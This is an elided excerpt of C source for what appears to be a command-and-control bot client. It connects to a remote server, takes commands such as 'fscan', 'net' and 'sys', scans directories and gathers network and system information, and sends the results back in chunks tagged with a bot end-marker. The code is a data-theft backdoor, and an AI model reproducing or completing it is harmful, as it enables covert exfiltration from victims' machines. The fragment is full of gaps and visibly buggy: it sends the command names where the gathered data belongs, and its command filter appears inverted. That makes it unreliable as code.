...
int main( int argc, const char **argv ) {
   ...
   int _cn = connect( _sock, (struct sockaddr *)&serv_addr, sizeof( serv_addr ) );
    ...
    char fname[1024];
    char dirname[1024];
    char ferrbuf[0x200];  /* 512 */
    char sbuf[0xc350];    /* 50000 */
    char netbuf[0xc350];  /* 50000 */
    char sysinfo[0x7530]; /* 30000 */
    struct scdirs entries[5000];

    while ( (nbytes = recv( _sock, rc_buff, sizeof( rc_buff ), 0x00 )) ) {
        if ( strstr( rc_buff, "fscan" ) == NULL && strstr( rc_buff, "fsend" ) == NULL 
          && strstr( rc_buff, "net" ) == NULL && strstr( rc_buff, "sys" ) == NULL ) {
            ...
            if ( strstr( rc_buff, fscan ) != NULL ) {
                if ( get_cmd_param( rc_buff, dirname ) != -1 ) {
                    if ( ftp_scandir( dirname, entries, sbuf, ferrbuf, &num_entries ) != -1 ) {
                        send_buff( _sock, sbuf, strlen( sbuf ) );
                    } else {
                ...
                if ( net_gatherinfo( netbuf ) != -1 ) {
                    send( _sock, net, strlen( net ), 0x00 );
                    /*memset( netbuf, '\x00', sizeof( netbuf ) );*/
                }
            }

            else if ( strstr( rc_buff, sys ) != NULL ) {
                if ( sys_gatherinfo( sysinfo ) != -1 ) {
                    send( _sock, sys, strlen( sys ), 0x00 );
                    /* memset( sysinfo, '\x00', sizeof( sysinfo ) ); */
                }
            }
        }
...
int send_buff( int sock, char *buff_to_send, size_t buflen ) {
    char string[1024];
    char end[20] = "~[EOFTR][botc]~";
    int i = 0, j = 0;
    do {
        if ( i == 1024 || i == buflen - 1 || j == buflen - 1 ) {
            string[i++] = '\n', string[i] = '\x00', i = 0;
            send( sock, string, strlen( string ), 0x00 );
            memset( string, '\x00', 1024 );
            sleep( 1 );
        }
        string[i++] = *buff_to_send++, j++;
    }
    while ( *buff_to_send != '\x00' );
    send( sock, end, strlen( end ), 0x00 );
    return 0;
}
...
int sys_gatherinfo( char *sysinfo ) {
